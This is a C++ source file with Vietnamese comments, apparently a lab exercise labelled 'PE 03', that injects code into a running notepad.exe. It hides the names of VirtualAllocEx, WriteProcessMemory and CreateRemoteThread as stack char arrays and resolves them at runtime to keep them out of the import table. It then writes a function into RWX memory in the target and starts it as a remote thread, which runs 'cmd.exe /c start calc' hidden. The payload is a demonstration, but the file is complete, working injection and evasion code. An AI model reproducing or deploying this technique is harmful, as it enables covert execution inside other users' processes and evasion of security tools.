#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa các mẫu con trỏ hàm động để ẩn giấu hoàn toàn bảng IAT tĩnh
typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

// Cấu trúc chứa tham số tuyệt đối - Giải pháp hóa giải lỗi RIP-Relative của bài báo
typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí (Position-Independent Function) gánh luồng chạy khi tiêm sang Notepad
DWORD WINAPI RemoteClassicPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Thực thi bằng con trỏ hàm tuyệt đối, né sạch rào cản Import Table
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetTargetProcessPID(const std::wstring& procName) {
    DWORD pid = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 03: CLASSIC INJECTION API OBFUSCATE x64 FLAT" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetName = L"notepad.exe";
    DWORD dwPID = GetTargetProcessPID(targetName);
    if (dwPID == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << dwPID << std::endl;

    // Tránh lưu chuỗi dạng string plain-text, nhúng trực tiếp mảng char lên Stack của CPU
    char k32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
    char vAllocName[] = { 'V','i','r','t','u','a','l','A','l','l','o','c','E','x',0 };
    char wMemName[] = { 'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',0 };
    char cThreadName[] = { 'C','r','e','a','t','e','R','e','m','o','t','e','T','h','r','e','a','d',0 };

    HMODULE hKernel32 = GetModuleHandleA(k32);
    if (!hKernel32) return EXIT_FAILURE;

    // Phân giải động địa chỉ hàm trực tiếp từ RAM kết hợp ẩn giấu chuỗi
    pVirtualAllocEx DynamicVirtualAllocEx = (pVirtualAllocEx)GetProcAddress(hKernel32, vAllocName);
    pWriteProcessMemory DynamicWriteProcessMemory = (pWriteProcessMemory)GetProcAddress(hKernel32, wMemName);
    pCreateRemoteThread DynamicCreateRemoteThread = (pCreateRemoteThread)GetProcAddress(hKernel32, cThreadName);

    if (!DynamicVirtualAllocEx || !DynamicWriteProcessMemory || !DynamicCreateRemoteThread) {
        std::cerr << "[-] Khong the phan giai dong cac API he thong!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da che dau chuoi chu va phan giai dong cac API thanh cong." << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) return EXIT_FAILURE;

    // Quy trình cấp phát động thích ứng kịch trần (Zero Static Buffers)
    SIZE_T functionSize = 500;
    LPVOID remoteCodeBuffer = DynamicVirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID remoteDataBuffer = DynamicVirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] VirtualAllocEx tu xa that bai!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code RWX cua payload dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo cấu trúc tham số tuyệt đối cục bộ trước khi đẩy sang RAM đối phương
    THREAD_DATA localData;
    localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy song song logic hàm thực thi và dữ liệu tham số tuyệt đối vào lòng Notepad từ xa
    DynamicWriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteClassicPayload, functionSize, NULL);
    DynamicWriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Anh xa logic ma may va tham so tuyet doi hoan tat." << std::endl;

    // Kích nổ luồng thực thi phụ từ xa thông qua con trỏ hàm động đã được giấu chuỗi
    std::cout << "[*] Dang khoi tao luong CreateRemoteThread an toan..." << std::endl;
    HANDLE hThread = DynamicCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, INFINITE); // Gánh luồng xử lý dứt điểm phẳng sạch
        std::cout << "[+] Classic Code Injection with API Obfuscation Successful!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] CreateRemoteThread failed! Error code: " << GetLastError() << std::endl;
    }

    // Thu hồi vùng nhớ và đóng Handle hệ thống triệt để chống Memory Leak
    VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, remoteDataBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}